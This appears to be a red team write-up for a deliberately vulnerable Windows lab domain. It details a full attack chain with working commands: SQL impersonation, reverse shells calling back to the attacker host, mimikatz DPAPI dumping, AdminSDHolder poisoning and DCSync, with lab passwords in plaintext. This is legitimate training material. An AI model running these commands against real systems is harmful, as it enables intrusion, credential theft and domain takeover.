# APT34 — Operation HOLLOW CROWN
## Red Team Exercise Write-Up — Range 4: Hollow Crown

> **Classification:** RESTRICTED — Internal Red Team Use Only

| Field | Detail |
|---|---|
| **Environment** | 5 × Windows Server 2019 |
| **Domain** | cyberange.local / CYBERANGE |
| **Actor** | APT34 (OilRig / Helix Kitten / Cobalt Gypsy) |
| **Attack Chain** | LDAP Passback → SQL Impersonation → Service Hijack → LAPS + DPAPI → AdminSDHolder → DCSync |
| **End Goal** | Full Domain Compromise — DCSync of cyberange.local |

---

## 1. Executive Summary

The chain runs across five hosts: a web frontend with a vulnerable LDAP configuration page, a MSSQL server, a development server running an exploitable service, a hardened jump host managed by LAPS, and the Domain Controller. Starting from an unauthenticated LDAP passback that leaks a service credential in cleartext, the operator pivots through SQL login impersonation, a service binary-path hijack, a LAPS-protected local admin password, and DPAPI-stored credentials, finishing with an AdminSDHolder DACL poisoning that yields Domain Admin and a full DCSync. No software exploit is required — every step abuses misconfiguration and excessive privilege.

### Attack Chain at a Glance

| Step | Source | Target | Technique | ATT&CK |
|---|---|---|---|---|
| 1 | Attacker (no creds) | SRV08-WEB | LDAP passback — capture `svc_ldap` cleartext bind | T1557 / T1552.001 |
| 2 | svc_ldap | SRV09-SQL | SQL `IMPERSONATE` on `sa` → `xp_cmdshell` as `svc_dev` | T1134 / T1059.003 |
| 3 | svc_dev | SRV10-DEV | Service binary-path hijack of `CorpBuildSvc` → `svc_build` → read LAPS | T1543.003 / T1574.011 |
| 4 | svc_build | SRV11-JUMP | LAPS local-admin → DPAPI → `svc_itadmin` | T1555.004 / T1003 |
| 5 | svc_itadmin | DC03 | AdminSDHolder WriteDACL → Domain Admins → DCSync | T1222 / T1003.006 |

---

## 2. Lab Environment

### 2.1 Host Inventory

| Hostname | OS | Role | Key Vulnerability |
|---|---|---|---|
| DC03.cyberange.local | Windows Server 2019 | Domain Controller + DNS | `svc_itadmin` holds WriteDACL on AdminSDHolder |
| SRV08-WEB.cyberange.local | Windows Server 2019 | IIS Web Frontend | Admin panel (`admin/admin`) with an LDAP passback test feature; `web.config.bak` and a backup share leak the bind password |
| SRV09-SQL.cyberange.local | Windows Server 2019 | MSSQL Server | `svc_ldap` granted `IMPERSONATE` on `sa`; `xp_cmdshell` reachable; SQL Agent runs as `svc_dev` |
| SRV10-DEV.cyberange.local | Windows Server 2019 | Development Server | `CorpBuildSvc` runs as `svc_build`; `svc_dev` holds `SERVICE_CHANGE_CONFIG` on it; `svc_build` can read SRV11-JUMP's LAPS password |
| SRV11-JUMP.cyberange.local | Windows Server 2019 | Jump Host | LAPS-managed local admin; `svc_itadmin` credentials cached in DPAPI |

### 2.2 Domain Accounts

| Account | Type | Group Membership | Purpose |
|---|---|---|---|
| svc_ldap | Service account | Domain Users | Web app LDAP bind account — INITIAL TARGET (`Ld@pB1nd#2025!`) |
| svc_dev | Service account | Domain Users | SQL/SQL-Agent execution context (`D3v$3rv!c3#2025`) |
| svc_build | Service account | Domain Users, LAPS-read on SRV11-JUMP | `CorpBuildSvc` identity — PIVOT TARGET (`Bu1ld@cc#2025!`) |
| svc_itadmin | Service account | WriteDACL on AdminSDHolder | IT admin service account — ADMINSDHOLDER TARGET (`1tAdm!nSvc#2025`) |
| admin_backup | Service account | Domain Admins | Backup DA used to validate persistence |
| jparker, slee, mchen … (×10) | User accounts | Domain Users | Regular staff |

### 2.3 Key Misconfigurations

Five deliberate misconfigurations chain together to enable full domain compromise from an unauthenticated foothold:

**LDAP passback on the web admin panel** — The SRV08-WEB admin console is reachable with default `admin/admin` credentials and exposes an LDAP configuration page with a "Test Connection" button. The application performs an LDAP simple bind to an operator-supplied server using the stored `svc_ldap` bind credentials. Pointing the server field at the attacker captures `svc_ldap`'s password in cleartext. The same password is additionally exposed in `web.config.bak`, in `infrastructure.html`, and in the `WebBackups$` share, providing three redundant capture paths.

**Excessive SQL IMPERSONATE grant** — On SRV09-SQL, `svc_ldap` holds the `IMPERSONATE` permission on the `sa` login. `EXECUTE AS LOGIN = 'sa'` therefore grants full sysadmin context, which is used to enable and run `xp_cmdshell`. Command execution runs as the SQL service account `svc_dev`, and a SQL Agent CmdExec job runs in the same context.

**Weak service DACL on CorpBuildSvc** — `svc_dev` holds `SERVICE_CHANGE_CONFIG` on the `CorpBuildSvc` service on SRV10-DEV, which runs as `svc_build`. Reconfiguring the service binary path and restarting it executes arbitrary commands as `svc_build`.

**Over-broad LAPS read and cached DPAPI credentials** — `svc_build` has read access to the `ms-Mcs-AdmPwd` attribute on SRV11-JUMP's computer object, exposing the cleartext local admin password. With local admin/SYSTEM on SRV11-JUMP, the operator extracts DPAPI master keys and decrypts the cached `svc_itadmin` credentials.

**WriteDACL on AdminSDHolder** — `svc_itadmin` holds `WriteDACL` on the `AdminSDHolder` object. Adding a GenericAll ACE and triggering SDProp propagates that ACE to every protected group, allowing the operator to add itself to Domain Admins. Because SDProp re-applies the ACE on each run, this also provides persistence.

### 2.4 Boot Order

Boot **DC03** first and wait 90 seconds for AD DS and DNS to fully initialise. The four member servers can then boot in any order. SRV09-SQL must complete service startup before Step 2, and SRV11-JUMP's LAPS rotation must have populated before Step 4. The lab is fully operational approximately 3–5 minutes after all five VMs are running.

---

## 3. Environment Setup

All commands are run from a **Kali Linux** attacker machine with network access to the lab subnet. Set the session variables first:

```bash
# Set these to your actual IPs
export KALI_IP=<your_kali_ip>
export DC_IP=<dc03_ip>
export WEB_IP=<srv08-web_ip>
export SQL_IP=<srv09-sql_ip>
export DEV_IP=<srv10-dev_ip>
export JUMP_IP=<srv11-jump_ip>
```

### 3.1 Required Tools

| Tool | Purpose |
|---|---|
| nmap | Network discovery and port scanning |
| nxc (NetExec) | SMB/LDAP/MSSQL enumeration, LAPS and DPAPI modules, local-auth checks |
| responder / netcat | Rogue LDAP listener for the passback capture |
| curl, smbclient | Web and SMB leak retrieval |
| impacket (mssqlclient, psexec, wmiexec, smbserver, secretsdump, dacledit) | SQL access, remote execution, credential dumping, ACL edits |
| evil-winrm | Interactive shells over WinRM |
| msfvenom | Service-hijack payload generation |
| mimikatz | DPAPI credential extraction (manual path) |
| bloodyAD | AdminSDHolder ACL read/write |
| ntpdate | Clock sync to DC for Kerberos |

---

## Step 1 — LDAP Passback: Credential Capture

**Target:** `SRV08-WEB.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1557 — Adversary-in-the-Middle / T1552.001 — Credentials in Files

### What This Step Does

Captures the `svc_ldap` domain credential by forcing the web application's LDAP configuration test to bind against an attacker-controlled listener.

### Why It Works

The admin panel accepts default `admin/admin` credentials and lets the operator set the LDAP server address. The "Test Connection" action performs an LDAP simple bind — which transmits the bind DN and password in cleartext — to whatever address is supplied. Redirecting it to Kali yields `svc_ldap`'s password directly.

### Phase 1a — Recon

```bash
nmap -sn 192.168.x.0/24
nmap -p 88 --open 192.168.x.0/24      # DC (Kerberos)
nmap -p 80 --open 192.168.x.0/24      # Web server
nmap -p 1433 --open 192.168.x.0/24    # SQL server

nmap -sV -sC -p- $WEB_IP -oN web_scan.txt
nmap -sV -sC -p- $SQL_IP -oN sql_scan.txt
nmap -sV -sC -p- $DEV_IP -oN dev_scan.txt
nmap -sV -sC -p- $JUMP_IP -oN jump_scan.txt
nmap -sV -sC -p- $DC_IP -oN dc_scan.txt

# Anonymous SMB and LDAP enumeration
nxc smb $WEB_IP $SQL_IP $DEV_IP $JUMP_IP $DC_IP --shares -u '' -p ''
nxc ldap $DC_IP -u '' -p '' --users
nxc ldap $DC_IP -u '' -p '' --groups

# Web surface
curl -s http://$WEB_IP/
curl -s http://$WEB_IP/admin/
curl -s http://$WEB_IP/docs/infrastructure.html
curl -s http://$WEB_IP/web.config.bak
smbclient //$WEB_IP/WebBackups$ -N -c "ls"
```

### Phase 1b — Start the Rogue LDAP Listener

```bash
# Option A: netcat (simplest — raw bind data)
sudo nc -nlvp 389
```
```bash
# Option B: responder (cleanest output)
sudo responder -I eth0 -wv
```

### Phase 1c — Trigger the Passback

1. Browse to `http://<WEB_IP>/admin/`
2. Log in with `admin` / `admin`
3. On the LDAP Configuration page, set **LDAP Server** to your Kali IP
4. Click **Test Connection**

The listener receives the cleartext bind:

```
svc_ldap / Ld@pB1nd#2025!
```

### Phase 1d — Validate the Credential

```bash
nxc smb $DC_IP -u svc_ldap -p 'Ld@pB1nd#2025!' -d cyberange.local
nxc smb $SQL_IP -u svc_ldap -p 'Ld@pB1nd#2025!' -d cyberange.local --shares
nxc mssql $SQL_IP -u svc_ldap -p 'Ld@pB1nd#2025!' -d cyberange.local
```

### Contingency C1 — Static Credential Leaks

The same `svc_ldap` password is recoverable without the passback:

```bash
# C1a — web.config.bak
curl -s http://$WEB_IP/web.config.bak | grep -i password

# C1b — infrastructure.html
curl -s http://$WEB_IP/docs/infrastructure.html | grep -i "pass"

# C1c — WebBackups$ share (IIS export XML)
mkdir -p /tmp/webbackups && cd /tmp/webbackups
smbclient //$WEB_IP/WebBackups$ -N -c "prompt OFF; mget *"
cat *
```

### Alternate Path (Skip-A) — ForceChangePassword svc_ldap → svc_build

```bash
net rpc password svc_build 'TestSkipA!2025' -U "CYBERANGE/svc_ldap%Ld@pB1nd#2025!" -S $DC_IP
nxc smb $DC_IP -u svc_build -p 'TestSkipA!2025' -d cyberange.local
# Revert for the rest of the run:
net rpc password svc_build 'Bu1ld@cc#2025!' -U "CYBERANGE/svc_ldap%Ld@pB1nd#2025!" -S $DC_IP
```

> **Step 1 Result:** `svc_ldap` (`Ld@pB1nd#2025!`) captured. Confirmed valid against the DC and granted MSSQL access on SRV09-SQL.

---

## Step 2 — SQL Login Impersonation

**Target:** `SRV09-SQL.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1134 — Access Token Manipulation / T1059.003 — Windows Command Shell

### What This Step Does

Escalates inside MSSQL from `svc_ldap` to `sa` via an `IMPERSONATE` grant, enables `xp_cmdshell`, and executes commands as `svc_dev`.

### Why It Works

`svc_ldap` holds `IMPERSONATE` on the `sa` login. `EXECUTE AS LOGIN = 'sa'` assumes full sysadmin rights, allowing `xp_cmdshell` to be enabled and run. The resulting commands execute in the security context of the SQL service account, `svc_dev`.

### Phase 2a — Connect and Confirm the Impersonation Right

```bash
impacket-mssqlclient 'CYBERANGE/svc_ldap:Ld@pB1nd#2025!@'$SQL_IP -windows-auth
```
```sql
SELECT DISTINCT b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';   -- returns: sa
```

### Phase 2b — Impersonate sa and Enable xp_cmdshell

```sql
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;                         -- sa

EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';                  -- cyberange\svc_dev
```

### Phase 2c — Command Execution via SQL Agent Job

```sql
USE msdb;
-- Remove any stale test job first
EXEC sp_delete_job @job_name = 'TestJob', @delete_unused_schedule = 1;

EXEC sp_add_job @job_name = 'TestJob';
EXEC sp_add_jobstep @job_name = 'TestJob', @step_name = 'run', @subsystem = 'CmdExec',
     @command = 'cmd /c whoami > C:\Users\Public\whoami.txt && ipconfig >> C:\Users\Public\whoami.txt';
EXEC sp_add_jobserver @job_name = 'TestJob';
EXEC sp_start_job @job_name = 'TestJob';
```

Wait 5 seconds, then read the result:

```sql
EXEC xp_cmdshell 'type C:\Users\Public\whoami.txt';   -- cyberange\svc_dev + network config
```

### Phase 2d — Reverse Shell (proves full execution)

```bash
nc -nlvp 4444                                          # Terminal 1
```
```bash
# Terminal 2 — place nc.exe in /opt/redteam/tools first
impacket-smbserver share /opt/redteam/tools -smb2support -username att -password att
```
```sql
USE msdb;
EXEC sp_add_job @job_name = 'RevShell';
EXEC sp_add_jobstep @job_name = 'RevShell', @step_name = 'run', @subsystem = 'CmdExec',
     @command = 'cmd /c net use \\KALI_IP\share /user:att att && \\KALI_IP\share\nc.exe -e cmd KALI_IP 4444';
EXEC sp_add_jobserver @job_name = 'RevShell';
EXEC sp_start_job @job_name = 'RevShell';
```

### Phase 2e — Clean Up Test Jobs

```sql
USE msdb;
EXEC sp_delete_job @job_name = 'TestJob', @delete_unused_schedule = 1;
EXEC sp_delete_job @job_name = 'RevShell', @delete_unused_schedule = 1;
```

### Alternate Path (Skip-B) — ServiceCredentials Table

```sql
USE DevAppDB;
SELECT * FROM dbo.ServiceCredentials;   -- 6 rows; row 4 = svc_itadmin / 1tAdm!nSvc#2025
```
```bash
nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local
```
If this validates, Steps 3 and 4 can be skipped and the operator can proceed directly to Step 5.

### Contingency C2a — TRUSTWORTHY + db_owner

```sql
REVERT;
SELECT SYSTEM_USER;          -- svc_ldap
USE DevAppDB;
EXECUTE AS USER = 'dbo';
SELECT SYSTEM_USER;          -- dbo
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
REVERT;
```

### Contingency C2c — CLR Assembly

```sql
USE DevAppDB;
EXEC dbo.sp_clr_exec 'whoami';   -- cyberange\svc_dev
```

> **Step 2 Result:** Command execution on SRV09-SQL as `cyberange\svc_dev` (`D3v$3rv!c3#2025`) via SQL impersonation. Reverse shell confirmed.

---

## Step 3 — Service Binary Path Hijack

**Target:** `SRV10-DEV.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1543.003 — Windows Service / T1574.011 — Services Registry Permissions Weakness

### What This Step Does

Reconfigures the `CorpBuildSvc` service to run an attacker payload, yielding a shell as `svc_build`, then reads the LAPS password for SRV11-JUMP.

### Why It Works

`svc_dev` holds `SERVICE_CHANGE_CONFIG` on `CorpBuildSvc`, which runs as `svc_build`. Changing the service binary path and restarting it executes arbitrary commands in the `svc_build` context. `svc_build` in turn can read SRV11-JUMP's `ms-Mcs-AdmPwd` LAPS attribute.

### Phase 3a — Confirm Access to the Service

```bash
nxc smb $DEV_IP -u svc_dev -p 'D3v$3rv!c3#2025' -d cyberange.local
evil-winrm -i $DEV_IP -u svc_dev -p 'D3v$3rv!c3#2025'   # shows CorpBuildSvc runs as svc_build
```

### Phase 3b — Hijack the Binary Path

```bash
nc -nlvp 4443                                            # Terminal 1
```
```bash
# Terminal 2 — payload + share
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI_IP LPORT=4443 -f exe -o /tmp/svc.exe
impacket-smbserver share /tmp/ -smb2support -username att -password att
```
```cmd
sc.exe stop CorpBuildSvc
sc.exe config CorpBuildSvc binPath= "cmd /c net use \\<KALI_IP>\share /user:att att && \\<KALI_IP>\share\svc.exe"
sc.exe start CorpBuildSvc
```

Terminal 1 receives a shell as `cyberange\svc_build`.

### Phase 3c — Read the LAPS Password for SRV11-JUMP

```cmd
powershell -c "$s = New-Object DirectoryServices.DirectorySearcher; $s.Filter = '(cn=SRV11-JUMP)'; $s.PropertiesToLoad.Add('ms-Mcs-AdmPwd') | Out-Null; $r = $s.FindOne(); $r.Properties['ms-mcs-admpwd']"
```
```bash
# Or from Kali
nxc ldap $DC_IP -u svc_build -p 'Bu1ld@cc#2025!' -M laps
```

### Phase 3d — Restore the Service (for re-testing)

```powershell
sc.exe config CorpBuildSvc binPath= "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\BuildService\BuildMonitor.ps1 -Service"
```

### Contingency C3a — Unquoted Service Path

```cmd
wmic service get name,pathname | findstr /v /i "C:\Windows" | findstr /i /v "\""   # CorpDevTools
icacls "C:\Program Files\Corp Dev"                                                  # Authenticated Users (M)
```

### Contingency C3b — Writable Scheduled Task

```cmd
schtasks /query /tn "NightlyBuildClean" /fo LIST /v
icacls "C:\BuildService\NightlyClean"   # runs as svc_build, folder writable by Authenticated Users
```

### Contingency C3c — AlwaysInstallElevated

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # 0x1
```

> **Step 3 Result:** Shell as `cyberange\svc_build` (`Bu1ld@cc#2025!`). SRV11-JUMP LAPS password retrieved.

---

## Step 4 — LAPS + DPAPI: Credential Extraction

**Target:** `SRV11-JUMP.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1555.004 — Credentials from Password Stores (DPAPI) / T1003 — OS Credential Dumping

### What This Step Does

Uses the LAPS password to gain local admin on SRV11-JUMP, then extracts the cached `svc_itadmin` credentials from DPAPI.

### Why It Works

The LAPS-managed local Administrator password grants full local admin on SRV11-JUMP. As local admin/SYSTEM, the operator decrypts DPAPI-protected credential blobs, recovering the `svc_itadmin` password stored on the host.

### Phase 4a — Retrieve the LAPS Password and Authenticate

```bash
nxc ldap $DC_IP -u svc_build -p 'Bu1ld@cc#2025!' -M laps
export LAPS_PW='<the_password_from_above>'

nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth   # [+] (Pwn3d!)
impacket-psexec ./Administrator:"$LAPS_PW"@$JUMP_IP            # or impacket-wmiexec
```

### Phase 4b — Extract DPAPI Credentials

```bash
# Method 1 — nxc dpapi module (easiest)
nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth --dpapi   # svc_itadmin / 1tAdm!nSvc#2025
```
```bash
# Method 2 — manual mimikatz
impacket-smbserver share /opt/redteam/tools -smb2support -username att -password att
```
```cmd
net use \\<KALI_IP>\share /user:att att
copy \\<KALI_IP>\share\mimikatz.exe C:\temp\m.exe
C:\temp\m.exe "privilege::debug" "sekurlsa::dpapi" "exit"
dir C:\Users\svc_itadmin\AppData\Roaming\Microsoft\Credentials\ /a
C:\temp\m.exe "dpapi::cred /in:C:\Users\svc_itadmin\AppData\Roaming\Microsoft\Credentials\<BLOB_FILE>" "exit"
C:\temp\m.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"
```

### Phase 4c — Validate svc_itadmin

```bash
nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local   # [+]
```

### Contingency C4a — AutoLogon Registry

```bash
nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth -x "reg query \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\" /v DefaultPassword"
nxc smb $JUMP_IP -u CorpAdmin -p 'J9m#Kx2v!Wq' --local-auth
```

### Contingency C4b — PSReadline History

```bash
nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth -x "type C:\Users\svc_itadmin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

### Contingency C4c — Unattend.xml

```bash
nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth -x "type C:\Windows\Panther\Unattend.xml"
echo "<BASE64_VALUE>" | base64 -d | iconv -f UTF-16LE -t UTF-8   # strip trailing 'AdministratorPassword'
```

> **Step 4 Result:** `svc_itadmin` (`1tAdm!nSvc#2025`) recovered and validated against the DC. Account holds WriteDACL on AdminSDHolder.

---

## Step 5 — AdminSDHolder Poisoning → Domain Admin → DCSync

**Target:** `DC03.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1222 — File and Directory Permissions Modification / T1003.006 — DCSync

### What This Step Does

Adds a GenericAll ACE to AdminSDHolder as `svc_itadmin`, forces SDProp to propagate it, adds the account to Domain Admins, and runs DCSync.

### Why It Works

`svc_itadmin` holds `WriteDACL` on the `AdminSDHolder` object. ACEs placed on AdminSDHolder are pushed by the SDProp process to all protected groups and their members (default cadence 60 minutes, or forced on demand). Granting itself GenericAll therefore yields the ability to add itself to Domain Admins, and the re-propagation makes the access self-healing.

### Phase 5a — Sync Clock and Confirm WriteDACL

```bash
sudo ntpdate $DC_IP

bloodyAD -d cyberange.local -u svc_itadmin -p '1tAdm!nSvc#2025' --host $DC_IP get writable --detail 2>/dev/null | grep -i adminsdholder
# or
dacledit.py 'cyberange.local/svc_itadmin:1tAdm!nSvc#2025' -dc-ip $DC_IP -target-dn "CN=AdminSDHolder,CN=System,DC=cyberange,DC=local" -action read 2>/dev/null | grep -i svc_itadmin
```

### Phase 5b — Add GenericAll ACE on AdminSDHolder

```bash
dacledit.py 'cyberange.local/svc_itadmin:1tAdm!nSvc#2025' -dc-ip $DC_IP \
    -target-dn "CN=AdminSDHolder,CN=System,DC=cyberange,DC=local" \
    -action write -ace-type full -principal svc_itadmin
# or
bloodyAD -d cyberange.local -u svc_itadmin -p '1tAdm!nSvc#2025' --host $DC_IP \
    add genericAll 'CN=AdminSDHolder,CN=System,DC=cyberange,DC=local' svc_itadmin
```

### Phase 5c — Force SDProp

```powershell
# Via evil-winrm as svc_itadmin (or any account with remote management)
$rootDSE = [ADSI]"LDAP://RootDSE"
$rootDSE.Put("RunProtectAdminGroupsTask", 1)
$rootDSE.SetInfo()
```

### Phase 5d — Add to Domain Admins and Verify

```bash
# Wait 1–2 minutes after forcing SDProp
net rpc group addmem "Domain Admins" "svc_itadmin" -U "CYBERANGE/svc_itadmin%1tAdm!nSvc#2025" -S $DC_IP

nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local           # (Pwn3d!)
nxc ldap $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local --groups | grep -i "domain admins"
```

### Phase 5e — DCSync

```bash
impacket-secretsdump 'CYBERANGE/svc_itadmin:1tAdm!nSvc#2025@'$DC_IP   # dumps Administrator + krbtgt + all hashes
```

### Phase 5f — Persistence Check (SDProp re-adds the ACE)

```powershell
# As admin_backup, remove svc_itadmin from Domain Admins, then force SDProp again
Remove-ADGroupMember -Identity "Domain Admins" -Members "svc_itadmin" -Confirm:$false
$rootDSE = [ADSI]"LDAP://RootDSE"; $rootDSE.Put("RunProtectAdminGroupsTask", 1); $rootDSE.SetInfo()
```
```bash
# Re-adding still works because the GenericAll ACE was re-propagated
net rpc group addmem "Domain Admins" "svc_itadmin" -U "CYBERANGE/svc_itadmin%1tAdm!nSvc#2025" -S $DC_IP
```

### Contingency C5a — Backup Operators

```bash
net rpc group addmem "Backup Operators" "svc_itadmin" -U "CYBERANGE/svc_itadmin%1tAdm!nSvc#2025" -S $DC_IP
nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local -x "whoami /groups" | grep -i backup
```

### Contingency C5b — Writable GPO

```bash
nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local -x "powershell -c \"Get-GPO -Name DC-HealthCheck-Policy\""
```

> **Step 5 Result:** Full domain compromise. `svc_itadmin` added to Domain Admins via AdminSDHolder; DCSync of `cyberange.local` recovers all hashes including `Administrator` and `krbtgt`. Access is self-healing through SDProp.

---

## Summary: What Each Step Proves

| Step | Technique Tested | Success Criteria |
|---|---|---|
| 0 | Network visibility | All 5 hosts found, ports identified |
| 1 | LDAP passback | `svc_ldap` captured in cleartext (plus C1a/C1b/C1c, Skip-A) |
| 2 | SQL IMPERSONATE + Agent | `xp_cmdshell` as `svc_dev` (plus Skip-B, C2a, C2c) |
| 3 | Service binPath hijack | Shell as `svc_build`; LAPS read (plus C3a/C3b/C3c) |
| 4 | LAPS + DPAPI | LAPS password works; `svc_itadmin` extracted (plus C4a/C4b/C4c) |
| 5 | AdminSDHolder → DA | DCSync succeeds as `svc_itadmin`; persistence confirmed (plus C5a/C5b) |
